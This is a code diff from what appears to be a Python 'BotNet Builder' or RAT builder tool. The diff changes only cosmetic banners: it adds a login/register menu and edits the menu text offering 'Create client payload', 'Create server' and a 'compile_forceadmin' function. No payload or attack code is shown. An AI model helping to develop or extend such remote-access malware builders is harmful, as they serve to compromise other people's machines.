@@ -27,7 +27,6 @@ def compile_forceadmin(filename):
 '''
 OTHER FUNCTIONS
 '''
-
 def clear():
     os.system('cls')
 
@@ -43,17 +42,24 @@ def print_slow(str):
 BANNERS
 '''
 
+auth_banner = f"""
+    {Fore.LIGHTGREEN_EX}1{Fore.RESET}.{Fore.CYAN} Login
+    {Fore.LIGHTGREEN_EX}2{Fore.RESET}.{Fore.CYAN} Register
+    {Fore.RESET}"""
+
+
 banner = Style.BRIGHT + f'''{Fore.LIGHTGREEN_EX}
  
 
              __           .~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~.
-           _/  \_         |    {Fore.CYAN}Welcome to BotNet Builder{Fore.LIGHTGREEN_EX}       |
-           ({Fore.LIGHTRED_EX}҂{Fore.WHITE}`_´{Fore.LIGHTGREEN_EX})         {Fore.LIGHTGREEN_EX}|  {Fore.CYAN}New Features Coming Soon...{Fore.LIGHTGREEN_EX}   |
+           _/  \_         |    {Fore.CYAN}Welcome to BotNet Builder{Fore.LIGHTGREEN_EX}    |
+           ({Fore.LIGHTRED_EX}҂{Fore.WHITE}`_´{Fore.LIGHTGREEN_EX})         {Fore.LIGHTGREEN_EX}|    {Fore.CYAN}Currently in BETA version{Fore.LIGHTGREEN_EX}    |
            <,{Fore.LIGHTBLACK_EX}═╦╤─{Fore.YELLOW} ҉ {Fore.LIGHTRED_EX}- -   {Fore.LIGHTGREEN_EX}'─────────────────────────────────'
            _/--\_         
    
 
     {Fore.LIGHTGREEN_EX}1{Fore.RESET}.{Fore.CYAN} Create client payload
     {Fore.LIGHTGREEN_EX}2{Fore.RESET}.{Fore.CYAN} Create server
-    {Fore.LIGHTGREEN_EX}420{Fore.RESET}.{Fore.LIGHTRED_EX} Exit RAT Builder
+
+    {Fore.LIGHTGREEN_EX}420{Fore.RESET}.{Fore.LIGHTRED_EX} Exit
 {Fore.RESET}'''
